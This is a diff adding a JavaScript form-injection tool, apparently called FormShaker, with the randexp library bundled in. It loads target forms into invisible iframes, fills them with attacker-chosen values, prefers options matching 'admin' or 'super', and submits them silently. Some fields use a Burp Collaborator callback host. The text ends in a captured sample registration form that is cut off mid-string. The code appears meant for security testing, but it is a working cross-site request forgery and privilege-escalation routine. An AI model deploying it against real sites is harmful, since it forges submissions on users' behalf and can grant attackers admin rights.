@@ -1,0 +1,681 @@
+    var settings=[{"name": "url", "regex": "link|url|enlace", "value": "HTTPS://hackerurl"},
+         {"name": "ip", "regex": "ip", "value": "IP ATTACKER"},
+         {"value": "hacker@email.com", "name": "email", "regex": "email"},
+         {"regex": "pass|contr", "value": "HACKERPASSW0RD", "name": "password"},
+         {"name": "radio", "regex": "admin|super"},
+         {"name": "checkbox", "regex": "admin|super"},
+         {"name": "select-one", "regex": "admin|super"}]
+        
+    /*----------------------------------------------------------------- Pivot HTTP Request */
+    /* It creates a iframe embedding the target form:
+     * referrer: or Origin, the URL that shows the target form.
+     * id: id of the form, this is used to identify the new created form.
+    */
+
+    
+
+
+    IframeElements=[]
+    IframeElementsID=0;
+    function injectForm(payload){
+        
+        // Create Iframe
+        newNode=document.createElement("iframe")
+        debug=false
+        if(debug)
+            newNode.style="width:500px;height:400px"
+        else
+            newNode.style="width:0;height:0;border:0; border:none;"
+            
+        newNode.id= payload.identifier
+        IframeElements.push(newNode)
+        
+        newNode.onload= function(){
+
+            if(debug){
+                console.log(IframeElements[IframeElementsID].contentWindow.document.body);
+                console.log(IframeElementsID);
+                console.log(payload.inputs)
+            }
+            
+            for(index in payload.inputs){
+                type=payload.inputs[index].Type
+                name=payload.inputs[index].name
+                value=payload.inputs[index].value
+                checked=payload.inputs[index].checked
+                
+                if(debug){
+                    console.log(IframeElements[IframeElementsID].id+" : "+type+ " - " +name+ " - " +value)
+                    console.log(IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0])
+                }
+                
+                if(IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0] !== undefined){
+                    IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].value=value
+                    
+                    if(IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].type == "checkbox" || IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].type == "radio"){
+                        IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].checked = checked
+                    }
+                    
+                    // IframeElements[0].contentWindow.document.getElementsByName("communicationsAllowed")[0]
+                    if (payload.inputs[index].Type=="submit"){
+                        payload.inputs[index].Type="hidden"
+                        
+                    }
+                    // submit form and remove it.
+                    if(!debug){
+                        IframeElements[IframeElementsID].onload=function() { this.remove()}
+                        IframeElements[IframeElementsID].contentWindow.document.getElementsByName(name)[0].form.submit()
+                    }
+                }
+                
+            }
+            IframeElementsID++;
+       
+        }
+        
+
+        newNode.src=payload.origin
+        document.body.appendChild(newNode)
+
+        
+    }
+
+    function Pivot_HTTPRequest(payloads){
+        
+        payloads = JSON.parse(payloads)
+        
+        if(payloads.length == 0)
+            return 
+            
+        for(i in payloads){
+            
+            
+            var auto_standalone=false;
+            // when the server doesn't response, then it uses the default standaloneSettings, if the server turns on, then the js lib uses the server's settings.
+            if(settings === undefined){
+                auto_standalone = true
+                settings = standaloneSettings
+            }            
+            
+            
+
+            
+            // standalone version
+            if(settings){
+                var v1={};
+                Object.assign(v1, payloads[0]);
+            
+                var v2={};
+                Object.assign(v2, payloads[0]);
+            
+                var TwoPayloads = [v1, v2];
+                // original values + overwritten values with settings (Standalone)
+                TwoPayloads[0].inputs = craftNewForms(payloads[i].inputs, false)
+                //-----------------------------
+                TwoPayloads[1].inputs = craftNewForms(payloads[i].inputs, true)
+                
+                console.log(TwoPayloads)
+                
+                injectForm(TwoPayloads[0])
+                injectForm(TwoPayloads[1])
+                
+            }
+            //else{
+                // original values + overwritten values with settings (Dashboard)
+                //payloads[i]
+                //Attempts.push()
+            //}
+            
+            
+            //injectForm(payloads[i])
+
+        }
+        
+    }
+
+    //------------------------[+] input-utils.js [+]-----------------------------------
+
+    /*
+        HTML Input manager
+
+    */
+
+
+    /*
+    Enviar al dashboard:
+    * pattern
+    * checked
+    */
+    /*
+    var settings={
+        "url":{"value":"HTTPS://HACKERURL", "regex":/link|url|enlace/i},
+        "ip":{"value":"IP ATTACKER", "regex":/ip/i},
+        "email":{"value":"HACKER@EMAIL.COM", "regex":/email/i},
+        "password":{"value":"HACKERPASSW0RD", "regex":/pass|contr/i},
+        "radio":{"value":"", "regex":/admin|super/i},
+        "checkbox":{"value":"", "regex":/admin|super/i},
+        "select-one":{"value":"", "regex":/admin|super/i},
+
+    }
+    */
+ 
+
+ 
+  //
+    
+
+
+    function getSetting(name){
+        for(var i = 0; i < settings.length; i++) {
+            if (settings[i].name == name){
+                return settings[i]
+                break;
+            }
+        }
+    }
+    
+
+    function applyCustomValuesV2(input){
+        
+        if(settings){
+            
+            if(input.modified)
+                return new Input(input.Type, input.name, input.value)
+            
+            // Replace with our settings
+            //if (settings.hasOwnProperty(input.name))
+            //    return new Input(input.Type, input.name, settings[input.name].value)
+            setting = getSetting(input.name)
+            if(setting)
+                return new Input(input.Type, input.name, setting.value)
+            
+            for(setting of settings){
+                if (new RegExp(setting.regex,"i").test(input.name) || input.Type == setting.name ){
+                    if(setting.value){
+                        return new Input(input.Type, input.name, setting.value)
+                    }
+                }
+            }
+            
+            //for (const [key, value] of Object.entries(settings)) {
+
+                //for(input of inputs){
+                    //if (new RegExp(value.regex).test(input.name) || input.Type == key ){
+                    //    if(value.value){
+                    //        return new Input(input.Type, input.name, value.value)
+                    //    }
+                    //}
+                //}
+            //}
+        }
+        return input
+        
+    }
+
+
+
+    // -------- UTILS ------------------------------------------
+    var today = new Date();
+    var dd = String(today.getDate()).padStart(2, '0');
+    var mm = String(today.getMonth() + 1).padStart(2, '0'); //January is 0!
+    var yyyy = today.getFullYear();
+    today = mm + '/' + dd + '/' + yyyy
+
+    //
+    // randexp v0.4.3
+    // Create random strings that match a given regular expression.
+    //
+    // Copyright (C) 2016 by Roly Fentanes (https://github.com/fent)
+    // MIT License
+    // http://github.com/fent/randexp.js/raw/master/LICENSE 
+    //
+    !function(){var e="RandExp",t=function(){return function e(t,n,r){function o(s,i){if(!n[s]){if(!t[s]){var u="function"==typeof require&&require;if(!i&&u)return u(s,!0);if(a)return a(s,!0);var p=new Error("Cannot find module '"+s+"'");throw p.code="MODULE_NOT_FOUND",p}var h=n[s]={exports:{}};t[s][0].call(h.exports,function(e){var n=t[s][1][e];return o(n?n:e)},h,h.exports,e,t,n,r)}return n[s].exports}for(var a="function"==typeof require&&require,s=0;s<r.length;s++)o(r[s]);return o}({1:[function(e,t,n){function r(e){return e+(e>=97&&122>=e?-32:e>=65&&90>=e?32:0)}function o(){return!this.randInt(0,1)}function a(e){return e instanceof h?e.index(this.randInt(0,e.length-1)):e[this.randInt(0,e.length-1)]}function s(e){if(e.type===p.types.CHAR)return new h(e.value);if(e.type===p.types.RANGE)return new h(e.from,e.to);for(var t=new h,n=0;n<e.set.length;n++){var o=s.call(this,e.set[n]);if(t.add(o),this.ignoreCase)for(var a=0;a<o.length;a++){var i=o.index(a),u=r(i);i!==u&&t.add(u)}}return e.not?this.defaultRange.clone().subtract(t):t}function i(e,t){"number"==typeof t.max&&(e.max=t.max),t.defaultRange instanceof h&&(e.defaultRange=t.defaultRange),"function"==typeof t.randInt&&(e.randInt=t.randInt)}function u(e,t){var n,i,p,h,c;switch(e.type){case l.ROOT:case l.GROUP:if(e.followedBy||e.notFollowedBy)return"";for(e.remember&&void 0===e.groupNumber&&(e.groupNumber=t.push(null)-1),n=e.options?a.call(this,e.options):e.stack,i="",h=0,c=n.length;c>h;h++)i+=u.call(this,n[h],t);return e.remember&&(t[e.groupNumber]=i),i;case l.POSITION:return"";case l.SET:var f=s.call(this,e);return f.length?String.fromCharCode(a.call(this,f)):"";case l.REPETITION:for(p=this.randInt(e.min,e.max===1/0?e.min+this.max:e.max),i="",h=0;p>h;h++)i+=u.call(this,e.value,t);return i;case l.REFERENCE:return t[e.value-1]||"";case l.CHAR:var g=this.ignoreCase&&o.call(this)?r(e.value):e.value;return String.fromCharCode(g)}}var p=e("ret"),h=e("discontinuous-range"),l=p.types,c=t.exports=function(e,t){if(this.defaultRange=this.defaultRange.clone(),e instanceof RegExp)this.ignoreCase=e.ignoreCase,this.multiline=e.multiline,i(this,e),e=e.source;else{if("string"!=typeof e)throw new Error("Expected a regexp or string");this.ignoreCase=t&&-1!==t.indexOf("i"),this.multiline=t&&-1!==t.indexOf("m")}this.tokens=p(e)};c.prototype.max=100,c.prototype.gen=function(){return u.call(this,this.tokens,[])},c.randexp=function(e,t){var n;return void 0===e._randexp?(n=new c(e,t),e._randexp=n):n=e._randexp,i(n,e),n.gen()},c.sugar=function(){RegExp.prototype.gen=function(){return c.randexp(this)}},c.prototype.defaultRange=new h(32,126),c.prototype.randInt=function(e,t){return e+Math.floor(Math.random()*(1+t-e))}},{"discontinuous-range":2,ret:3}],2:[function(e,t,n){function r(e,t){this.low=e,this.high=t,this.length=1+t-e}function o(e,t){return this instanceof o?(this.ranges=[],this.length=0,void 0!==e&&this.add(e,t),void 0):new o(e,t)}function a(e){e.length=e.ranges.reduce(function(e,t){return e+t.length},0)}r.prototype.overlaps=function(e){return!(this.high<e.low||this.low>e.high)},r.prototype.touches=function(e){return!(this.high+1<e.low||this.low-1>e.high)},r.prototype.add=function(e){return this.touches(e)&&new r(Math.min(this.low,e.low),Math.max(this.high,e.high))},r.prototype.subtract=function(e){return this.overlaps(e)?e.low<=this.low&&e.high>=this.high?[]:e.low>this.low&&e.high<this.high?[new r(this.low,e.low-1),new r(e.high+1,this.high)]:e.low<=this.low?[new r(e.high+1,this.high)]:[new r(this.low,e.low-1)]:!1},r.prototype.toString=function(){return this.low==this.high?this.low.toString():this.low+"-"+this.high},r.prototype.clone=function(){return new r(this.low,this.high)},o.prototype.add=function(e,t){function n(e){for(var t=[],n=0;n<s.ranges.length&&!e.touches(s.ranges[n]);)t.push(s.ranges[n].clone()),n++;for(;n<s.ranges.length&&e.touches(s.ranges[n]);)e=e.add(s.ranges[n]),n++;for(t.push(e);n<s.ranges.length;)t.push(s.ranges[n].clone()),n++;s.ranges=t,a(s)}var s=this;return e instanceof o?e.ranges.forEach(n):e instanceof r?n(e):(void 0===t&&(t=e),n(new r(e,t))),this},o.prototype.subtract=function(e,t){function n(e){for(var t=[],n=0;n<s.ranges.length&&!e.overlaps(s.ranges[n]);)t.push(s.ranges[n].clone()),n++;for(;n<s.ranges.length&&e.overlaps(s.ranges[n]);)t=t.concat(s.ranges[n].subtract(e)),n++;for(;n<s.ranges.length;)t.push(s.ranges[n].clone()),n++;s.ranges=t,a(s)}var s=this;return e instanceof o?e.ranges.forEach(n):e instanceof r?n(e):(void 0===t&&(t=e),n(new r(e,t))),this},o.prototype.index=function(e){for(var t=0;t<this.ranges.length&&this.ranges[t].length<=e;)e-=this.ranges[t].length,t++;return t>=this.ranges.length?null:this.ranges[t].low+e},o.prototype.toString=function(){return"[ "+this.ranges.join(", ")+" ]"},o.prototype.clone=function(){return new o(this)},t.exports=o},{}],3:[function(e,t,n){var r=e("./util"),o=e("./types"),a=e("./sets"),s=e("./positions");t.exports=function(e){var t,n,i=0,u={type:o.ROOT,stack:[]},p=u,h=u.stack,l=[],c=function(t){r.error(e,"Nothing to repeat at column "+(t-1))},f=r.strToChars(e);for(t=f.length;t>i;)switch(n=f[i++]){case"\\":switch(n=f[i++]){case"b":h.push(s.wordBoundary());break;case"B":h.push(s.nonWordBoundary());break;case"w":h.push(a.words());break;case"W":h.push(a.notWords());break;case"d":h.push(a.ints());break;case"D":h.push(a.notInts());break;case"s":h.push(a.whitespace());break;case"S":h.push(a.notWhitespace());break;default:/\d/.test(n)?h.push({type:o.REFERENCE,value:parseInt(n,10)}):h.push({type:o.CHAR,value:n.charCodeAt(0)})}break;case"^":h.push(s.begin());break;case"$":h.push(s.end());break;case"[":var g;"^"===f[i]?(g=!0,i++):g=!1;var y=r.tokenizeClass(f.slice(i),e);i+=y[1],h.push({type:o.SET,set:y[0],not:g});break;case".":h.push(a.anyChar());break;case"(":var d={type:o.GROUP,stack:[],remember:!0};n=f[i],"?"===n&&(n=f[i+1],i+=2,"="===n?d.followedBy=!0:"!"===n?d.notFollowedBy=!0:":"!==n&&r.error(e,"Invalid group, character '"+n+"' after '?' at column "+(i-1)),d.remember=!1),h.push(d),l.push(p),p=d,h=d.stack;break;case")":0===l.length&&r.error(e,"Unmatched ) at column "+(i-1)),p=l.pop(),h=p.options?p.options[p.options.length-1]:p.stack;break;case"|":p.options||(p.options=[p.stack],delete p.stack);var v=[];p.options.push(v),h=v;break;case"{":var R,C,w=/^(\d+)(,(\d+)?)?\}/.exec(f.slice(i));null!==w?(R=parseInt(w[1],10),C=w[2]?w[3]?parseInt(w[3],10):1/0:R,i+=w[0].length,h.push({type:o.REPETITION,min:R,max:C,value:h.pop()})):h.push({type:o.CHAR,value:123});break;case"?":0===h.length&&c(i),h.push({type:o.REPETITION,min:0,max:1,value:h.pop()});break;case"+":0===h.length&&c(i),h.push({type:o.REPETITION,min:1,max:1/0,value:h.pop()});break;case"*":0===h.length&&c(i),h.push({type:o.REPETITION,min:0,max:1/0,value:h.pop()});break;default:h.push({type:o.CHAR,value:n.charCodeAt(0)})}return 0!==l.length&&r.error(e,"Unterminated group"),u},t.exports.types=o},{"./positions":4,"./sets":5,"./types":6,"./util":7}],4:[function(e,t,n){var r=e("./types");n.wordBoundary=function(){return{type:r.POSITION,value:"b"}},n.nonWordBoundary=function(){return{type:r.POSITION,value:"B"}},n.begin=function(){return{type:r.POSITION,value:"^"}},n.end=function(){return{type:r.POSITION,value:"$"}}},{"./types":6}],5:[function(e,t,n){var r=e("./types"),o=function(){return[{type:r.RANGE,from:48,to:57}]},a=function(){return[{type:r.CHAR,value:95},{type:r.RANGE,from:97,to:122},{type:r.RANGE,from:65,to:90}].concat(o())},s=function(){return[{type:r.CHAR,value:9},{type:r.CHAR,value:10},{type:r.CHAR,value:11},{type:r.CHAR,value:12},{type:r.CHAR,value:13},{type:r.CHAR,value:32},{type:r.CHAR,value:160},{type:r.CHAR,value:5760},{type:r.CHAR,value:6158},{type:r.CHAR,value:8192},{type:r.CHAR,value:8193},{type:r.CHAR,value:8194},{type:r.CHAR,value:8195},{type:r.CHAR,value:8196},{type:r.CHAR,value:8197},{type:r.CHAR,value:8198},{type:r.CHAR,value:8199},{type:r.CHAR,value:8200},{type:r.CHAR,value:8201},{type:r.CHAR,value:8202},{type:r.CHAR,value:8232},{type:r.CHAR,value:8233},{type:r.CHAR,value:8239},{type:r.CHAR,value:8287},{type:r.CHAR,value:12288},{type:r.CHAR,value:65279}]},i=function(){return[{type:r.CHAR,value:10},{type:r.CHAR,value:13},{type:r.CHAR,value:8232},{type:r.CHAR,value:8233}]};n.words=function(){return{type:r.SET,set:a(),not:!1}},n.notWords=function(){return{type:r.SET,set:a(),not:!0}},n.ints=function(){return{type:r.SET,set:o(),not:!1}},n.notInts=function(){return{type:r.SET,set:o(),not:!0}},n.whitespace=function(){return{type:r.SET,set:s(),not:!1}},n.notWhitespace=function(){return{type:r.SET,set:s(),not:!0}},n.anyChar=function(){return{type:r.SET,set:i(),not:!0}}},{"./types":6}],6:[function(e,t,n){t.exports={ROOT:0,GROUP:1,POSITION:2,SET:3,RANGE:4,REPETITION:5,REFERENCE:6,CHAR:7}},{}],7:[function(e,t,n){var r=e("./types"),o=e("./sets"),a="@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^ ?",s={0:0,t:9,n:10,v:11,f:12,r:13};n.strToChars=function(e){var t=/(\[\\b\])|(\\)?\\(?:u([A-F0-9]{4})|x([A-F0-9]{2})|(0?[0-7]{2})|c([@A-Z\[\\\]\^?])|([0tnvfr]))/g;return e=e.replace(t,function(e,t,n,r,o,i,u,p){if(n)return e;var h=t?8:r?parseInt(r,16):o?parseInt(o,16):i?parseInt(i,8):u?a.indexOf(u):p?s[p]:void 0,l=String.fromCharCode(h);return/[\[\]{}\^$.|?*+()]/.test(l)&&(l="\\"+l),l})},n.tokenizeClass=function(e,t){for(var a,s,i=[],u=/\\(?:(w)|(d)|(s)|(W)|(D)|(S))|((?:(?:\\)(.)|([^\]\\]))-(?:\\)?([^\]]))|(\])|(?:\\)?(.)/g;null!=(a=u.exec(e));)if(a[1])i.push(o.words());else if(a[2])i.push(o.ints());else if(a[3])i.push(o.whitespace());else if(a[4])i.push(o.notWords());else if(a[5])i.push(o.notInts());else if(a[6])i.push(o.notWhitespace());else if(a[7])i.push({type:r.RANGE,from:(a[8]||a[9]).charCodeAt(0),to:a[10].charCodeAt(0)});else{if(!(s=a[12]))return[i,u.lastIndex];i.push({type:r.CHAR,value:s.charCodeAt(0)})}n.error(t,"Unterminated character class")},n.error=function(e,t){throw new SyntaxError("Invalid regular expression: /"+e+"/: "+t)}},{"./sets":5,"./types":6}]},{},[1])}()(1);"function"==typeof define&&"object"==typeof define.amd?define(e,function(){return t}):"undefined"!=typeof window&&(window[e]=t)}();
+      
+    // ---------------------------------------------------------  
+
+    function Input(type, name, value, defaultValue, pattern, checked) {
+        this.Type = type;
+        this.name = name;
+        this.value = value;
+        this.defaultValue=defaultValue;
+        this.pattern=pattern
+        this.checked=checked
+        
+    }
+
+    // mutiple radio? 
+    // &nameinput-collection=superadmin
+    function getFinalRadioInputs(inputs, allInputsFilled){
+        // Radio type inputs always have a value
+        var checkedInput;
+        var settingsPreferedInput;
+        var randomValue;
+        var defaultValue;
+        var modifiedFromWebsite;
+        var radioGroups=[]
+        
+        if(inputs){
+            groupedRadioInputs = inputs.reduce(function (r, a) {
+
+                if (a.Type == "radio"){
+                    r[a.name] = r[a.name] || [];
+                    
+                    r[a.name].push(a);
+                    
+                }
+                return r;
+            }, Object.create(null));
+            
+            if(groupedRadioInputs){
+                for (const [key, radios] of Object.entries(groupedRadioInputs)) {
+
+                    var radioGroup = []
+                    for(input of radios){
+                        if (input.Type == "radio"){
+                        
+                            if(input.modified){
+                                modifiedFromWebsite = new Input(input.Type, input.name, input.value)
+                                break
+                            
+                            }else if( settings && new RegExp( getSetting("radio").regex,"i" ).test(input.value)){
+                            //if( settings && new RegExp( settings["radio"].regex ).test(input.value)){
+                                settingsPreferedInput = new Input(input.Type, input.name, input.value, "", "", true)
+                                //radioGroup=[]
+                                //radioGroup.push(settingsPreferedInput)
+                                break
+                                
+                            }else if(input.checked ){
+                                checkedInput = new Input(input.Type, input.name, input.value, "", "", input.checked)
+                                //radioGroup.push(checkedInput)
+                                
+                            }else{
+                                // last in the list
+                                randomValue = new Input(input.Type, input.name, input.value, "", "", input.checked)
+                                defaultValue = new Input(input.Type, input.name, input.value, "", "", input.checked)
+                                
+                            }
+                        } 
+                        
+                    }
+                    
+                    
+                    if(modifiedFromWebsite){
+                        radioGroups.push(modifiedFromWebsite)
+                        modifiedFromWebsite=null
+                    }else if(settingsPreferedInput){
+                        radioGroups.push(settingsPreferedInput)
+                        settingsPreferedInput=null
+                    }else if(checkedInput){
+                        radioGroups.push(checkedInput)
+                        checkedInput=null
+                    }else{
+                        if(allInputsFilled && randomValue){
+                            radioGroups.push(randomValue)
+                            randomValue=null
+                        }else{
+                            radioGroups.push(defaultValue)
+                            defaultValue=null
+                        }
+                    }
+                   
+                }
+            }
+        }
+        
+        if(radioGroups.length>0){
+            return radioGroups
+            
+        }else{
+            return null
+            
+        }
+    }
+
+    // multiple checkbox? multiple checkbox can be checked
+    // &superadmin=on&regularuser=on
+    function getFinalCheckboxInputs(inputs, allInputsFilled){
+        var checkedInput;
+        var settingsPreferedInput;
+        var randomValue;
+        var defaultValue;
+        var modifiedFromWebsite;
+        var checkboxes=[]
+
+        if(inputs){
+            for(input of inputs){
+                if (input.Type == "checkbox"){
+                
+                    if(input.modified){
+                        modifiedFromWebsite = new Input(input.Type, input.name, input.value)
+                        
+                        
+                    }else if( settings && new RegExp( getSetting("checkbox").regex,"i" ).test(input.name)){
+                    //if( settings && new RegExp( settings["checkbox"].regex ).test(input.name)){
+                        settingsPreferedInput = new Input(input.Type, input.name, "on", "", "", true)
+                        
+                        
+                    }else if(input.checked ){
+                        checkedInput = new Input(input.Type, input.name, "on", "", "", input.checked)
+                        
+                    
+                    }else{
+                        // last in the list
+                        randomValue = new Input(input.Type, input.name, "on", "", "", input.checked)
+                        if(input.checked){
+                            defaultValue = new Input(input.Type, input.name, "on", "", "", input.checked)
+                        }else{
+                            defaultValue = new Input(input.Type, input.name, "off", "", "", input.checked)
+                        }
+                    }
+                } 
+            }
+            
+            if(modifiedFromWebsite){
+                checkboxes.push(modifiedFromWebsite)
+                modifiedFromWebsite=null
+            }else if(settingsPreferedInput){
+                checkboxes.push(settingsPreferedInput)
+            }else if(checkedInput){
+                checkboxes.push(checkedInput)
+                
+            }else{
+                if(allInputsFilled && randomValue){
+                    checkboxes.push(randomValue)
+                }else{
+                    checkboxes.push(defaultValue)
+                }
+            }
+        }
+
+        if(checkboxes.length>0){
+            return checkboxes
+        }else{
+            return null
+            
+        }
+
+    }
+
+
+    // multiple select-one? each select-one has its options, easy to group.
+    // &nameselect=value&nameselect=superadmin
+    function getFinalSelectOneInputs(inputs, allInputsFilled){
+        var selectedInput;
+        var settingsPreferedInput;
+        var randomValue;
+        var selectGroups = [];
+        
+         //console.log('{"type":"'+inputs.type+'","name":"'+inputs.name+'","value":"'+JSON.stringify(_options)+'","defaultValue","'+defaultValue+'"}')
+        
+        if(inputs){
+            groupedRadioInputs = inputs.reduce(function (r, a) {
+
+                if (a.Type == "select-one"){
+                    r[a.name] = r[a.name] || [];
+                    
+                    r[a.name].push(a);
+                    
+                }
+                return r;
+            }, Object.create(null));
+
+            if(groupedRadioInputs){
+                for (const [key, selects] of Object.entries(groupedRadioInputs)) {
+
+                    for(input of selects){
+                        
+                        if(input.Type == "select-one"){
+                            
+                            if(input.defaultvalue !== undefined && input.defaultvalue != ""){
+                                selectGroups.push(new Input(input.Type, input.name, input.defaultvalue))
+                                break
+                            }
+                            
+                            options=JSON.parse(input.value)
+                            
+                            for(j=0;j<options.length;j++) {
+                                var option = options[j];
+                                //var _options = [];
+                                
+                                    
+                                if( settings && new RegExp( getSetting("select-one").regex,"i" ).test(option.text)){
+                                //if( settings && new RegExp( settings["select-one"].regex ).test(option.text)){                                    
+                                    settingsPreferedInput = new Input(input.Type, input.name, option.value)
+                                    break
+                                
+                                // when the default value is not a valid one -> "...choose... one option" or the value is "" it accepts is as long as "inputs can be empty"
+                                }else if(option.selected && (!option.text.includes("choose") || option.value !="" ) && !allInputsFilled){
+                                    selectedInput= new Input(input.Type, input.name, option.value)
+                                    
+                                    
+                                }else if(!option.text.includes("choose") || option.value != ""){
+                                    randomValue = new Input(input.Type, input.name, option.value)
+                                    
+                                    
+                                }
+                     
+                            }
+                            
+
+                        }
+                        if(settingsPreferedInput){
+                            selectGroups.push(settingsPreferedInput)
+                            settingsPreferedInput=null
+                        }else if(selectedInput){
+                            selectGroups.push(selectedInput)
+                            selectedInput=null
+                        }else{
+                            if(allInputsFilled && randomValue)
+                                selectGroups.push(randomValue)
+                            
+                        }
+                    }
+
+
+                }
+            }
+        }
+
+        if(selectGroups.length>0){
+            return selectGroups
+            
+        }else{
+            return null
+            
+        }
+
+        
+    }
+
+
+
+
+
+
+
+    /**
+     * var inputs = list of inputs 
+     * // for radio inputs
+     * getOneInput(inputs)
+     * for input validateInputs
+     *      get finalRadioInput
+     *      build querystring (new inputs + finalRadioInput)
+     * make request
+     */
+
+    /**
+     * Returns the object of type Input or null
+     * @param ...
+     * @param ...
+     * @returns {Input}
+     */
+    function validateInputs(input, allInputsFilled){
+        //console.log('{"Type":"'+input.Type+'","name":"'+input.name+'","value":"'+input.value+'","pattern":"'+input.pattern+'","checked":'+input.checked+',"defaultvalue":"","modified":false}')
+        
+        input = applyCustomValuesV2(input)
+        
+        output=input.value
+        input.name=input.name.toLowerCase()
+
+        
+        // when the input has default value, it is returned.
+        if (input.value != "" ){ 
+            return new Input(input.Type, input.name, input.value)
+        
+        // when the input doesn't have default value and doesn't match our settings, a random value relying on the type and the name is set:
+        }else if(allInputsFilled){
+            // Check the input type:
+            // the second statement is to avoid return 111222 when the input type is text and the name is phone. the scenario is covered below 
+            if(input.Type == "text" ) {
+                return getRandomValue(input)
+                
+            }else if(input.Type == "password"){
+                return getRandomValue(input)
+                
+            }else if(input.Type == "checkbox"){
+                return new Input(input.Type, input.name, "off")
+                
+            }else if(input.Type == "hidden"){ // anti CSRF token generally
+                return new Input(input.Type, input.name, input.value)
+                
+            }else if(input.Type == "submit"){ // ...
+                return new Input(input.Type, input.name, input.value)
+                
+            }else if( input.Type == "tel"  ){
+                return getRandomValue(input)
+                
+            }else if( input.Type == "url"  ){
+                return getRandomValue(input)
+                
+            }else if( input.Type == "radio"  ){
+                return getRandomValue(input)            
+                
+            }else{
+                return new Input(input.Type,input.name,"111222")
+                
+            }
+            // ELSE IF : PARA LOS SELECT/OPTIONS, FALTA IMPLEMENTARLO, NCESITO EJEMPLO DE INJECTED FORM CON SELECTS
+         
+        
+        }else{
+            return new Input(input.Type,input.name, input.value)
+        }
+        
+
+        
+    }
+
+
+    // Set random values relying on the type or the name
+    function getRandomValue(input){
+
+        
+        if (new RegExp(/date|fecha/i).test(input.name) || input.Type.includes("date") ){
+            return new Input(input.Type,input.name,today)
+            
+        }else if (input.pattern=="" && ( new RegExp(/mail|correo/i).test(input.name) || input.Type == "email")  ){
+            return new Input(input.Type, input.name, "random@gbvltudrrfqypjqquxuxl4aho8uyin.burpcollaborator.net")
+            
+        }else if (input.pattern=="" && ( new RegExp(/passw|contra/i).test(input.name) || input.Type == "password")  ){
+            return new Input(input.Type, input.name, "FormShaker!1")
+            
+        }else if (input.pattern=="" && ( new RegExp(/phone|telefono/i).test(input.name) || input.Type == "tel")  ){
+            return new Input(input.Type, input.name, "0788998877")
+            
+        }else if (input.pattern=="" && ( new RegExp(/url|link|enlace/i).test(input.name) || input.Type == "url" ) ){
+            return new Input(input.Type, input.name, "https://gbvltudrrfqypjqquxuxl4aho8uyin.burpcollaborator.net")
+            
+        }else if(input.pattern){ // as a last chance it generates a value relying on the pattern when it is present
+            return new Input(input.Type, input.name, new RandExp(input.pattern).gen() )
+            
+        }else{
+            return new Input(input.Type, input.name, "111223")
+            
+        }
+    }
+
+
+    function craftNewForms(inputs, allInputsFilled){
+
+        var tmpInputs=[]
+        
+        var radio=getFinalRadioInputs(inputs, allInputsFilled)
+        var selectone=getFinalSelectOneInputs(inputs, allInputsFilled)
+        var checkbox=getFinalCheckboxInputs(inputs, allInputsFilled)
+        
+        if(radio)
+            for(inp of radio){
+                tmpInputs.push(inp)
+            }
+        
+        if(selectone)
+            for(inp of selectone){
+                tmpInputs.push(inp)
+            }
+
+        if(checkbox)
+            for(inp of checkbox){
+                tmpInputs.push(inp)
+            }
+        
+        for(input of inputs){
+            if(input.Type != "radio" && input.Type != "checkbox" && input.Type != "select-one"){
+                tmpInputs.push(validateInputs(input, allInputsFilled))
+            }
+        }    
+        
+        newForm = JSON.parse(JSON.stringify(tmpInputs))
+        
+        if(debug){
+            console.log("Two attempts of form injection, logging both payloads:")
+            console.log(newForm)
+        
+        }
+        
+        return newForm
+        
+    }
+
+    /*
+    data=[{"id":"5fb7f4ed1d41c81ef38a3337","creationdate":"2020-11-20T17:55:09.697+01:00","updatedAt":"2020-11-20T17:55:09.697+01:00","active":true,"sessionID":"Formshaker-8303","action":"https://aaaaaaaaaaa.com/www/register","origin":"https://aaaaaaaaaaa.com/www/register","method":"post","outerHTML":"\u003cform action=\"/www/register\" method=\"post\" accept-charset=\"utf-8\" enctype=\"application/x-www-form-urlencoded\" id=\"registerForm\"\u003e\n\u003cinput type=\"hidden\" name=\"authenticityToken\" value=\"677b5d86402f7a1cfd3b956cccbf601cd830dff3\"\u003e\n        \u003ch2\u003e1 Crea tu cuenta aaaaaaaaaaa\u003c/h2\u003e\n\n        \u003cp\u003eRegístrate \u0026nbsp;con tu email y confirma tu cuenta de usuario. Una vez que inicies sesión, puedes empezar a \u003cem\u003eparear\u003c/em\u003e servicios y bloquearlos o desbloquearlos.\u003c/p\u003e\n\n        \u003cp class=\"margin-bottom-20\"\u003e\u003c/p\u003e\n                \u003cdiv class=\"input-group margin-bottom-20\"\u003e\n            \u003cspan class=\"input-group-addon\"\u003e\u003ci class=\"fa fa-user\"\u003e\u003c/i\u003e\u003c/span\u003e\n            \u003cinput type=\"text\" class=\"form-control\" placeholder=\"Nombre\" name=\"name\" id=\"name\" value=\"\"\u003e\n        \u003c/div\u003e\n        \u003cdiv class=\"input-group margin-bottom-20\"\u003e\n            \u003cspan class=\"input-group-addon\"\u003e\u003ci class=\"fa fa-envelope\"\u003e\u003c/i\u003e\u003c/span\u003e\n            \u003cinput type=\"text\" class=\"form-control\" placeholder=\"Correo electrónico\" name=\"email\" id=\"email\" value=\"\"\u003e\n        \u003c/div\u003e\n        \u003cdiv class=\"input-group margin-bottom-20\"\u003e\n            \u003cspan class=\"input-group-addon\"\u003e\u003ci class=\"fa fa-lock\"\u003e\u003c/i\u003e\u003c/span\u003e\n            \u003cinput type=\"password\" class=\"form-control\" placeholder=\"Nueva contraseña (mín. 6 caracteres)\" name=\"password\" id=\"password\" autocomplete=\"off\"\u003e\n        \u003c/div\u003e\n        \u003cdiv class=\"input-group margin-bottom-20\"\u003e\n            \u003cspan class=\"input-group-addon\"\u003e\u003ci class=\"fa fa-lock\"\u003e\u003c/i\u003e\u003c/span\u003e\n            \u003cinput type=\"password\" class=\"form-control\" placeholder=\"Confirmar nueva contraseña\" name=\"passwordCheck\" id=\"passwordCheck\" autocomplete=\"off\"\u003e\n        \u003c/div\u003e\n        \u003cdiv class=\"checkbox-list\"\u003e\n            \u003clabel class=\"checkbox\" style=\"font-size: 13px;\"\u003e \u003cinput type=\"checkbox\" id=\"terms\" name=\"terms\" title=\"Debes aceptar las condiciones de uso marcando el cuadro\"\u003e\n            Confirmo que he leído y que acepto las 